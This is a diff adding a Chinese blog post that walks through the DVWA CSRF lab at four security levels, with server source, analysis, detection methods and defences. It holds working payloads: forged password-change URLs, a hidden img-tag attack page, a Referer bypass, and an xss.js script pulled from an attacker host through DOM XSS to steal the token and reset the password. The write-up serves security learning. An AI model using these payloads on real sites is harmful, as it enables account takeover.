@@ -1,0 +1,1328 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CSRF,DVWA,practice," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Cross Site Request Forgery (CSRF)IntroductionCSRF（Cross-site request forgery）跨站请求伪造:    主要利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。">
+<meta name="keywords" content="CSRF,DVWA,practice">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA-CSRF">
+<meta property="og:url" content="http://yoursite.com/2018/07/26/DVWA-CSRF/index.html">
+<meta property="og:site_name" content="Ahodor&#39;Via">
+<meta property="og:description" content="Cross Site Request Forgery (CSRF)IntroductionCSRF（Cross-site request forgery）跨站请求伪造:    主要利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574859/blog/CSRF/csrf_low_0.png">
+<meta property="og:image" content="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574860/blog/CSRF/csrf_low_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574862/blog/CSRF/csrf_low_2.png">
+<meta property="og:image" content="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574878/blog/CSRF/csrf_middle_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574882/blog/CSRF/csrf_middle_2.png">
+<meta property="og:image" content="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574883/blog/CSRF/csrf_middle_3.png">
+<meta property="og:image" content="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574869/blog/CSRF/csrf_high_1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574871/blog/CSRF/csrf_high_2.png">
+<meta property="og:image" content="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574875/blog/CSRF/csrf_impossible_0.png">
+<meta property="og:updated_time" content="2018-07-26T03:28:14.663Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DVWA-CSRF">
+<meta name="twitter:description" content="Cross Site Request Forgery (CSRF)IntroductionCSRF（Cross-site request forgery）跨站请求伪造:    主要利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。">
+<meta name="twitter:image" content="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574859/blog/CSRF/csrf_low_0.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/07/26/DVWA-CSRF/"/>
+
+
+
+
+
+  <title>DVWA-CSRF | Ahodor'Via</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ahodor'Via</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/26/DVWA-CSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ahodor">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ahodor'Via">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DVWA-CSRF</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-26T11:25:48+08:00">
+                2018-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Cross-Site-Request-Forgery-CSRF"><a href="#Cross-Site-Request-Forgery-CSRF" class="headerlink" title="Cross Site Request Forgery (CSRF)"></a>Cross Site Request Forgery (CSRF)</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><strong>CSRF（Cross-site request forgery）跨站请求伪造:</strong><br>    主要利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
+<h3 id="跨站脚本（XSS）与跨站请求伪造-CSRF-区别"><a href="#跨站脚本（XSS）与跨站请求伪造-CSRF-区别" class="headerlink" title="跨站脚本（XSS）与跨站请求伪造(CSRF)区别"></a>跨站脚本（XSS）与跨站请求伪造(CSRF)区别</h3><p>XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574859/blog/CSRF/csrf_low_0.png" alt="image"></p>
+<h3 id="服务端源代码"><a href="#服务端源代码" class="headerlink" title="服务端源代码"></a>服务端源代码</h3><pre><code>&lt;?php
+
+if( isset( $_GET[ &apos;Change&apos; ] ) ) {
+    // Get input
+    $pass_new  = $_GET[ &apos;password_new&apos; ];
+    $pass_conf = $_GET[ &apos;password_conf&apos; ];
+
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // Update the database
+        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+        // Feedback for the user
+        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    }
+    else {
+        // Issue with passwords matching
+        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+?&gt; 
+</code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre><code>1、判断是否设置了Change变量
+2、新设置的密码与确认密码是否相同
+3、相同则将新密码做md5然后做update
+4、可以看到并没有验证新旧密码相同，没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现）
+</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1、观察请求方式</p>
+<p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574860/blog/CSRF/csrf_low_1.png" alt="image"></p>
+<pre><code>/dvwa/vulnerabilities/csrf/?password_new=test1&amp;password_conf=test1&amp;Change=Change
+</code></pre><p>2、构造url更改点击点击链接受害者的密码</p>
+<pre><code>/dvwa/vulnerabilities/csrf/?password_new=yourpasswd&amp;password_conf=yourpasswd&amp;Change=Change
+</code></pre><p>当受害人刚刚登入访问了该站点，session没有失效，点击了这个链接后他的密码就会变成我们构造好的密码，为了增加隐蔽性可以将url换成短url，更高级的可以制作一个攻击的页面，让受害者访问，不知不觉完成攻击（注意使用相同的浏览器）</p>
+<p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574862/blog/CSRF/csrf_low_2.png" alt="image"></p>
+<h2 id="Middle"><a href="#Middle" class="headerlink" title="Middle"></a>Middle</h2><h3 id="服务端源代码-1"><a href="#服务端源代码-1" class="headerlink" title="服务端源代码"></a>服务端源代码</h3><pre><code>CSRF Source
+&lt;?php
+
+if( isset( $_GET[ &apos;Change&apos; ] ) ) {
+    // Checks to see where the request came from
+    if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) {
+        // Get input
+        $pass_new  = $_GET[ &apos;password_new&apos; ];
+        $pass_conf = $_GET[ &apos;password_conf&apos; ];
+
+        // Do the passwords match?
+        if( $pass_new == $pass_conf ) {
+            // They do!
+            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+            $pass_new = md5( $pass_new );
+
+            // Update the database
+            $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;
+            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+            // Feedback for the user
+            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+        }
+        else {
+            // Issue with passwords matching
+            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+        }
+    }
+    else {
+        // Didn&apos;t come from a trusted source
+        echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+?&gt;
+</code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>与之前相比，这里检查了是否同源<br>    if( stripos( $_SERVER[ ‘HTTP_REFERER’ ] ,$_SERVER[ ‘SERVER_NAME’ ])<br>    int eregi(string pattern, string string)<br>    检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。</p>
+<p>可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.xx.xx），希望通过这种机制抵御CSRF攻击。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h5 id="过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192-168-xx-xx）"><a href="#过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192-168-xx-xx）" class="headerlink" title="过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.xx.xx）"></a>过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.xx.xx）</h5><p>我们可以将攻击页面命名为192.168.10.11.html（页面被放置在攻击者的服务器里，这里是192.168.10.10）就可以绕过了</p>
+<pre><code>&lt;img src=&quot;http://192.168.10.11/dvwa/pvulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;
+
+&lt;h1&gt;404&lt;h1&gt;
+
+&lt;h2&gt;file not found.&lt;h2&gt;
+</code></pre><p>抓包后在Repeater中修改HTTP数据包中的Referer参数为</p>
+<pre><code>http://192.168.10.10/admin/test_csrf_192.168.10.11.html
+</code></pre><p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574878/blog/CSRF/csrf_middle_1.png" alt="image"></p>
+<p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574882/blog/CSRF/csrf_middle_2.png" alt="image"></p>
+<p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574883/blog/CSRF/csrf_middle_3.png" alt="image"></p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="服务端源代码-2"><a href="#服务端源代码-2" class="headerlink" title="服务端源代码"></a>服务端源代码</h3><pre><code>&lt;?php
+
+if( isset( $_GET[ &apos;Change&apos; ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );
+
+    // Get input
+    $pass_new  = $_GET[ &apos;password_new&apos; ];
+    $pass_conf = $_GET[ &apos;password_conf&apos; ];
+
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // Update the database
+        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+        // Feedback for the user
+        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    }
+    else {
+        // Issue with passwords matching
+        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt; 
+</code></pre><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>关键代码</p>
+<pre><code>// Check Anti-CSRF token
+    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );
+
+
+// Generate Anti-CSRF token
+generateSessionToken();
+</code></pre><p>High级别的带入引入了Anti-CSRF token,<br>用户每次访问改密页面时，服务器会通过generateSessionToken()返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有客户端提交的token参数与服务器端一致时，服务器端才会处理客户端的响应。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>要绕过High Security Level的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p>
+<p>1、试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。</p>
+<p>xss.js</p>
+<pre><code>alert(document.cookie);
+var theUrl = &apos;http://192.168.10.11/dvwa/vulnerabilities/csrf/&apos;;
+    if(window.XMLHttpRequest) {
+        xmlhttp = new XMLHttpRequest();
+    }else{
+        xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+    }
+var count = 0;
+    xmlhttp.withCredentials = true;
+    xmlhttp.onreadystatechange=function(){
+        if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200)
+        {
+            var text = xmlhttp.responseText;
+            var regex = /user_token\&apos; value\=\&apos;(.*?)\&apos; \/\&gt;/;
+            var match = text.match(regex);
+            console.log(match);
+            alert(match[1]);
+                var token = match[1];
+                    var new_url = &apos;http://192.168.10.11/dvwa/vulnerabilities/csrf/?user_token=&apos;+token+&apos;&amp;password_new=test&amp;password_conf=test&amp;Change=Change&apos;;
+                    if(count==0){
+                        count++;
+                        xmlhttp.open(&quot;GET&quot;,new_url,false);
+                        xmlhttp.send();
+                    }
+
+
+        }
+    };
+    xmlhttp.open(&quot;GET&quot;,theUrl,false);
+    xmlhttp.send();
+</code></pre><p>xss.js放置于攻击者的网站上：<a href="http://192.168.10.10/admin/xss.js" target="_blank" rel="noopener">http://192.168.10.10/admin/xss.js</a></p>
+<p>2、DOM XSS与CSRF结合：</p>
+<p>CSRF结合同Security Level的DOM XSS，通过ajax实现跨域请求来获取用户的user_token，用以下链接来让受害者访问：</p>
+<pre><code>http://192.168.10.11/dvwa/vulnerabilities/xss_d/?default=English#%3Cscript%20src=%22http://192.168.10.10/admin/xss.js%22%3E%3C/script%3E
+</code></pre><p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574869/blog/CSRF/csrf_high_1.png" alt="image"></p>
+<p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574871/blog/CSRF/csrf_high_2.png" alt="image"></p>
+<p>成功修改密码为test</p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574875/blog/CSRF/csrf_impossible_0.png" alt="image"></p>
+<h3 id="服务端源代码-3"><a href="#服务端源代码-3" class="headerlink" title="服务端源代码"></a>服务端源代码</h3><pre><code>&lt;?php
+
+if( isset( $_GET[ &apos;Change&apos; ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );
+
+    // Get input
+    $pass_curr = $_GET[ &apos;password_current&apos; ];
+    $pass_new  = $_GET[ &apos;password_new&apos; ];
+    $pass_conf = $_GET[ &apos;password_conf&apos; ];
+
+    // Sanitise current password input
+    $pass_curr = stripslashes( $pass_curr );
+    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass_curr = md5( $pass_curr );
+
+    // Check that the current password is correct
+    $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );
+    $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );
+    $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );
+    $data-&gt;execute();
+
+    // Do both new passwords match and does the current password match the user?
+    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {
+        // It does!
+        $pass_new = stripslashes( $pass_new );
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // Update database with new password
+        $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; );
+        $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR );
+        $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );
+        $data-&gt;execute();
+
+        // Feedback for the user
+        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    }
+    else {
+        // Issue with passwords matching
+        echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+</code></pre><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>关键代码</p>
+<pre><code> // Check Anti-CSRF token
+checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 
+
+
+/ Generate Anti-CSRF token
+</code></pre><p>generateSessionToken(); </p>
+<p>利用PDO技术防御SQL注入，需要输入原密码来进行验证，在不知道原密码的情况下无法进行攻击</p>
+<pre><code>$pass_curr = stripslashes( $pass_curr ); 
+
+// Check that the current password is correct
+$data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );
+$data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );
+$data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );
+$data-&gt;execute(); 
+</code></pre><h2 id="CSRF漏洞的分类及检测挖掘方法主要有三种："><a href="#CSRF漏洞的分类及检测挖掘方法主要有三种：" class="headerlink" title="CSRF漏洞的分类及检测挖掘方法主要有三种："></a>CSRF漏洞的分类及检测挖掘方法主要有三种：</h2><h3 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h3><p>请求直接是个GET请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。</p>
+<h4 id="检测方法："><a href="#检测方法：" class="headerlink" title="检测方法："></a>检测方法：</h4><p>网页操作某功能，抓包后，如果发现满足上面条件，然后再去页面测试下，基本就可以确定存在不存在CSRF漏洞了。</p>
+<h3 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h3><p>请求是个POST请求，post请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。</p>
+<h4 id="检测方法：-1"><a href="#检测方法：-1" class="headerlink" title="检测方法："></a>检测方法：</h4><p>网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。如果有token等参数，可以尝试将token去掉，然后再将referer也去掉，进行验证。这种CSRF漏洞的利用，是需要在自己服务器构造一个form表单的，然后将服务器form表单的URL作为CSRF攻击进行利用的，或者用js代码生成form表单，或者用ajax实现。</p>
+<h3 id="第三种："><a href="#第三种：" class="headerlink" title="第三种："></a>第三种：</h3><p>请求是POST，post请求中没有token参数，但是验证了referer信息。然而可以将post请求改写为get请求，然后通过第一种情况下的那个方法利用。</p>
+<h4 id="检测方法：-2"><a href="#检测方法：-2" class="headerlink" title="检测方法："></a>检测方法：</h4><p>就是先执行了第二种的验证后，发现有对CSRF进行防御。然后将post请求改写为GET请求，发现仍然可以成功执行。漏洞成因是因为服务器端接收请求参数的时候，没有严格的用$_POST 而是用的类似于 $_REQUEST这种post，get请求的参数都可以接收的写法。</p>
+<h2 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h2><p>主要可以应用以下介绍的几种方法：</p>
+<h3 id="限制验证cookie的到期时间："><a href="#限制验证cookie的到期时间：" class="headerlink" title="限制验证cookie的到期时间："></a>限制验证cookie的到期时间：</h3><p>这些cookie的合法时间越短，黑客利用你的Web应用程序的机会就越小。不过，这个时间越短，用户就越不方便。因此，你需要在安全性和方便性之间进行平衡。</p>
+<h3 id="执行重要业务之前，要求用户提交额外的信息："><a href="#执行重要业务之前，要求用户提交额外的信息：" class="headerlink" title="执行重要业务之前，要求用户提交额外的信息："></a>执行重要业务之前，要求用户提交额外的信息：</h3><p>要求用户在进行重要业务前输入口令，这可以防止黑客发动CSRF攻击（只要浏览器中没有包含口令），因为这种重要信息无法预测或轻易获得。</p>
+<h3 id="使用秘密的无法预测的验证符号："><a href="#使用秘密的无法预测的验证符号：" class="headerlink" title="使用秘密的无法预测的验证符号："></a>使用秘密的无法预测的验证符号：</h3><p>当保存在用户浏览器中的cookie仅由一次会话确认时，CSRF攻击才会有效。所以在每次HTTP请求（当然攻击者无法提前知道）中都有附加的特定会话的信息，这样就可以挫败CSRF攻击。不过，如果这种应用程序存在跨站脚本漏洞，黑客就有可能访问这种验证符号。</p>
